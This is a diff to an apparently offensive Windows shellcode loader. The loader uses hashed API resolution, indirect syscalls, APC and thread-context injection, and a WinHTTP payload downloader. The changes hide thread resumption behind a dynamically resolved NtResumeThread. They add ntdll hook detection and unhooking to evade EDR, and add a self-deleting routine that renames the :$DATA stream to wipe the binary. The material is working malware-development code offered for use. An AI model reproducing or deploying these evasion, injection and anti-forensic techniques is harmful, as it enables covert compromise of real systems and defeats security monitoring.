@@ -26,10 +26,12 @@ typedef public NTSTATUS(NTAPI* _NtMapViewOfSection)(IN HANDLE SectionHandle, IN 
 typedef public NTSTATUS(NTAPI* _NtUnmapViewOfSection)(IN HANDLE ProcessHandle, IN PVOID BaseAddress OPTIONAL);
 typedef enum _SECTION_INHERIT : DWORD { ViewShare = 1, ViewUnmap = 2 } SECTION_INHERIT, * PSECTION_INHERIT;
 typedef public NTSTATUS(NTAPI* _NtQueueApcThread)(HANDLE TargetThread, PVOID ApcRoutine, PVOID Argument1, PVOID Argument2, PVOID Argument3, ULONG ApcReserved);
+typedef public NTSTATUS(NTAPI* _NtResumeThread)( IN HANDLE ThreadHandle, OUT PULONG SuspendCount OPTIONAL);
 
 using myNtTestAlert = NTSTATUS(NTAPI*)();
 
-
+// The new data stream name
+#define NEW_STREAM L":selfdel"
 
 
 
@@ -73,6 +75,7 @@ constexpr auto ntcreatethread_Rotr32A = HashStringDjb2A("NtCreateThreadEx");
 constexpr auto ntwrite_Rotr32A = HashStringDjb2A("NtWriteVirtualMemory");
 constexpr auto ntquery_Rotr32A = HashStringDjb2A("NtQueryInformationThread");
 constexpr auto ntqueue_Rotr32A = HashStringDjb2A("NtQueueApcThread");
+constexpr auto ntresume_Rotr32A = HashStringDjb2A("NtResumeThread");
 
 // static variables
 char path[] = { 'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','n','t','d','l','l','.','d','l','l',0 };
@@ -227,10 +230,136 @@ FARPROC CustomGetProcAddress(IN HMODULE hModule, IN DWORD lpApiName) {
 
 
 
+// Detect if the first bytes of Nt address are hooked
+// Stolen from https://github.com/TheD1rkMtr
+BOOL isItHooked(LPVOID addr) {
+/*
+    BYTE stub[] = "\x4c\x8b\xd1\xb8";
+    std::string charData = (char*)addr;
+
+    if (memcmp(addr, stub, 4) != 0) {
+        printf("\t[!] First bytes are HOOKED : ");
+        for (int i = 0; i < 4; i++) {
+            BYTE currentByte = charData[i];
+            printf("\\x%02x", currentByte);
+        }
+        printf(" (different from ");
+        for (int i = 0; i < 4; i++) {
+            printf("\\x%02x", stub[i]);
+        }
+        printf(")\n");
+        return TRUE;
+    }
+    return FALSE;
+*/
+}
+
+
+
+
+
+void unhooking() {
+/*
+    // Copy ntdll to a fresh memory alloc and overwrite calls adresses
+    // Stolen from https://www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++
+    printf("[+] Detecting ntdll hooking\n");
+    int nbHooks = 0;
+    if (isItHooked(CustomGetProcAddress(CustomGetModuleHandle(_ntdll), ntalloc_Rotr32A))) {
+        printf("\t[!] NtAllocateVirtualMemory is Hooked\n");
+        nbHooks++;
+    }
+    else {
+        printf("\t[+] NtAllocateVirtualMemory Not Hooked\n");
+    }
+    if (isItHooked(CustomGetProcAddress(CustomGetModuleHandle(_ntdll), ntprotect_Rotr32A))) {
+        printf("\t[!] NtProtectVirtualMemory is Hooked\n");
+        nbHooks++;
+    }
+    else {
+        printf("\t[+] NtProtectVirtualMemory Not Hooked\n");
+    }
+    if (isItHooked(CustomGetProcAddress(CustomGetModuleHandle(_ntdll), ntcreatethread_Rotr32A))) {
+        printf("\t[!] NtCreateThreadEx is Hooked\n");
+        nbHooks++;
+    }
+    else {
+        printf("\t[+] NtCreateThreadEx Not Hooked\n");
+    }
+    if (isItHooked(CustomGetProcAddress(CustomGetModuleHandle(_ntdll), ntquery_Rotr32A))) {
+        printf("\t[!] NtQueryInformationThread Hooked\n");
+        nbHooks++;
+    }
+    else {
+        printf("\t[+] NtQueryInformationThread Not Hooked\n");
+    }
+    if (nbHooks > 0) {
+        HANDLE process = GetCurrentProcess();
+        MODULEINFO mi = {};
+        HMODULE ntdllModule = CustomGetModuleHandle(_ntdll);
+        GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
+        LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;
+        HANDLE ntdllFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+        HANDLE ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
+        LPVOID ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0);
+        PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
+        PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);
+        for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
+            PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
+            if (!strcmp((char*)hookedSectionHeader->Name, (char*)sntdll)) {
+                DWORD oldProtection = 0;
+                bool isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
+                memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
+                isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
+            }
+        }
+        printf("\n[+] Detecting hooks in new ntdll module\n");
+
+        if (isItHooked(CustomGetProcAddress(CustomGetModuleHandle(_ntdll), ntalloc_Rotr32A))) {
+            printf("\t[!] NtAllocateVirtualMemory is Hooked\n");
+        }
+        else {
+            printf("\t[+] NtAllocateVirtualMemory Not Hooked\n");
+        }
+        if (isItHooked(CustomGetProcAddress(CustomGetModuleHandle(_ntdll), ntprotect_Rotr32A))) {
+            printf("\t[!] NtProtectVirtualMemory is Hooked\n");
+        }
+        else {
+            printf("\t[+] NtProtectVirtualMemory Not Hooked\n");
+        }
+        if (isItHooked(CustomGetProcAddress(CustomGetModuleHandle(_ntdll), ntcreatethread_Rotr32A))) {
+            printf("\t[!] NtCreateThreadEx is Hooked\n");
+        }
+        else {
+            printf("\t[+] NtCreateThreadEx Not Hooked\n");
+        }
+        if (isItHooked(CustomGetProcAddress(CustomGetModuleHandle(_ntdll), ntquery_Rotr32A))) {
+            printf("\t[!] NtQueryInformationThread Hooked\n");
+        }
+        else {
+            printf("\t[+] NtQueryInformationThread Not Hooked\n");
+        }
+    }
+*/
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 /**
 *   Download a raw payload from an external website into a buffer
 */
 std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {
+/*
     printf("[+] Downloading remote payload\n");
     HINTERNET hSession = WinHttpOpen(NULL,WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,WINHTTP_NO_PROXY_NAME,WINHTTP_NO_PROXY_BYPASS,WINHTTP_FLAG_SECURE_DEFAULTS);
     HINTERNET hConnect = WinHttpConnect(hSession,baseAddress,INTERNET_DEFAULT_HTTPS_PORT,0);
@@ -250,6 +379,7 @@ std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {
     WinHttpCloseHandle(hConnect);
     WinHttpCloseHandle(hSession);
     return buffer;
+*/
 }
 
 
@@ -425,7 +555,8 @@ void Indirect_RawExec_ppid(std::vector<BYTE> sh, DWORD exPID) {
     pContext->Rcx = (DWORD64)hRemoteAddress;
     SetThreadContext(threadHandle, pContext);
     printf("[+] Resuming execution\n");
-    ResumeThread(threadHandle);
+    _NtResumeThread resume = (_NtResumeThread)CustomGetProcAddress(hNtdll, ntresume_Rotr32A);
+    resume(threadHandle, NULL);
 
     FARPROC pNtUnmapViewOfSection = CustomGetProcAddress(hNtdll, ntunmap_Rotr32A);
     UINT_PTR pNtUnmapViewOfSectionSyscallID = (UINT_PTR)pNtUnmapViewOfSection + 4;
@@ -523,8 +654,6 @@ void IndirectAPC() {
     testAlert();
 
     printf("[+] Shellcode executed\n");
-
-    getchar();
     return;
 }
 
@@ -620,14 +749,65 @@ void IndirectRemoteAPC(DWORD exPID) {
     myNtTestAlert testAlert = (myNtTestAlert)(CustomGetProcAddress(CustomGetModuleHandle(_ntdll), RTIME_HASHA("NtTestAlert")));
     indirect_sys(threadHandle, (PVOID)apcRoutine, NULL, NULL, NULL, NULL);
     printf("[+] Resuming execution\n");
-    ResumeThread(threadHandle);
+
+    _NtResumeThread resume = (_NtResumeThread)CustomGetProcAddress(hNtdll, ntresume_Rotr32A);
+    resume(threadHandle, NULL);
 
     testAlert();
     printf("[+] Shellcode executed\n");
-
-    getchar();
     return;
 }
 
 
 
+
+
+
+
+
+/**
+*   Self-delete function to rename the :$DATA data stream and mark the file for deletion
+*   Credit to MaldevAcademy
+*/
+BOOL DeleteSelf() {
+    printf("\n[+] Beginning self-deletion process\n");
+    WCHAR szPath[MAX_PATH * 2] = { 0 };
+    FILE_DISPOSITION_INFO Delete = { 0 };
+    HANDLE hFile = INVALID_HANDLE_VALUE;
+    PFILE_RENAME_INFO pRename = NULL;
+    const wchar_t* NewStream = (const wchar_t*)NEW_STREAM;
+    SIZE_T sRename = sizeof(FILE_RENAME_INFO) + sizeof(NewStream);
+
+    // Allocating enough buffer for the 'FILE_RENAME_INFO' structure
+    pRename = (PFILE_RENAME_INFO)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sRename);
+
+    // Cleaning up some structures
+    ZeroMemory(szPath, sizeof(szPath));
+    ZeroMemory(&Delete, sizeof(FILE_DISPOSITION_INFO));
+
+    // Marking the file for deletion (used in the 2nd SetFileInformationByHandle call)
+    Delete.DeleteFile = TRUE;
+    // Setting the new data stream name buffer and size in the 'FILE_RENAME_INFO' structure
+    pRename->FileNameLength = sizeof(NewStream);
+    RtlCopyMemory(pRename->FileName, NewStream, sizeof(NewStream));
+    // Getting the current file name
+    GetModuleFileNameW(NULL, szPath, MAX_PATH * 2);
+    // Opening a handle to the current file
+    hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
+
+    printf("[+] Renaming :$DATA to %s\n", NEW_STREAM);
+    // Renaming the data stream
+    SetFileInformationByHandle(hFile, FileRenameInfo, pRename, sRename);
+    CloseHandle(hFile);
+
+    // Opening a new handle to the current file
+    hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
+    printf("[+] Deleting binary file\n");
+
+    // Marking for deletion after the file's handle is closed
+    SetFileInformationByHandle(hFile, FileDispositionInfo, &Delete, sizeof(Delete));
+    printf("[+] Done\n");
+    CloseHandle(hFile);
+    HeapFree(GetProcessHeap(), 0, pRename);
+    return TRUE;
+}
